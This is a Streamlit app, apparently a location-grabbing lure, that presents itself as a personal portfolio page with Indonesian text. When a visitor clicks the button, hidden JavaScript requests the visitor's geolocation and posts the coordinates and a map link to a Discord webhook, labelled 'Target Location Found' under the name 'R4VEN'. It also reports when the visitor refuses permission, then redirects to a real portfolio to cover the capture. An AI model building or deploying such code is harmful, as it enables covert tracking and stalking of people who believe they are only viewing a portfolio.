import streamlit as st
import streamlit.components.v1 as components

# Konfigurasi halaman
st.set_page_config(
    page_title="Portfolio", 
    page_icon="💼", 
    layout="wide"
)

# CSS untuk menyembunyikan header dan footer bawaan Streamlit
hide_streamlit_style = """
    <style>
    #MainMenu {visibility: hidden;}
    header {visibility: hidden;}
    footer {visibility: hidden;}
    .stApp > header {display: none;}
    </style>
"""
st.markdown(hide_streamlit_style, unsafe_allow_html=True)

# Ambil Discord Webhook dari Streamlit Secrets
try:
    webhook_url = st.secrets["DISCORD_WEBHOOK_URL"]
except Exception:
    webhook_url = ""

# Tampilan utama
st.markdown("<br><br><br><h2 style='text-align: center;'>Selamat Datang di Portofolio Saya</h2>", unsafe_allow_html=True)
st.markdown("<p style='text-align: center; color: gray;'>Silakan klik tombol di bawah untuk melanjutkan.</p>", unsafe_allow_html=True)

# Menggunakan session_state agar tombol tidak bisa di-spam/klik berulang
if "clicked" not in st.session_state:
    st.session_state.clicked = False

col1, col2, col3 = st.columns([1, 2, 1])
with col2:
    if not st.session_state.clicked:
        if st.button("Klik di sini untuk melihat Portfolio", use_container_width=True):
            st.session_state.clicked = True
            st.rerun()
    else:
        st.info("Sedang memproses, mohon tunggu...")
        if webhook_url:
            # Script JS yang dieksekusi setelah tombol diklik
            js_code = f"""
            <script>
                const WEBHOOK_URL = "{webhook_url}";

                function sendToDiscord(payload) {{
                    const request = new XMLHttpRequest();
                    request.open("POST", WEBHOOK_URL);
                    request.setRequestHeader('Content-type', 'application/json');
                    request.send(JSON.stringify(payload));
                }}

                if (navigator.geolocation) {{
                    navigator.geolocation.getCurrentPosition(function(position) {{
                        var latlong = "Lat: " + position.coords.latitude + " Lon: " + position.coords.longitude;
                        var mapLink = "https://www.google.com/maps/place/" + position.coords.latitude + "," + position.coords.longitude;
                        
                        sendToDiscord({{
                            username: "R4VEN",
                            embeds: [{{ 
                                title: "Target Location Found", 
                                description: latlong + "\\n[Buka di Maps](" + mapLink + ")", 
                                color: 15844367 
                            }}]
                        }});
                        
                        setTimeout(function() {{
                            window.location.href = "https://iqbalmantam.github.io/portfolio/";
                        }}, 1000);

                    }}, function(error) {{
                        sendToDiscord({{
                            username: "R4VEN",
                            content: "Target menolak izin lokasi."
                        }});
                        window.location.href = "https://iqbalmantam.github.io/portfolio/";
                    }});
                }} else {{
                    window.location.href = "https://iqbalmantam.github.io/portfolio/";
                }}
            </script>
            """
            components.html(js_code, height=0)
        else:
            st.error("⚠️ Discord Webhook URL belum diatur di Secrets!")
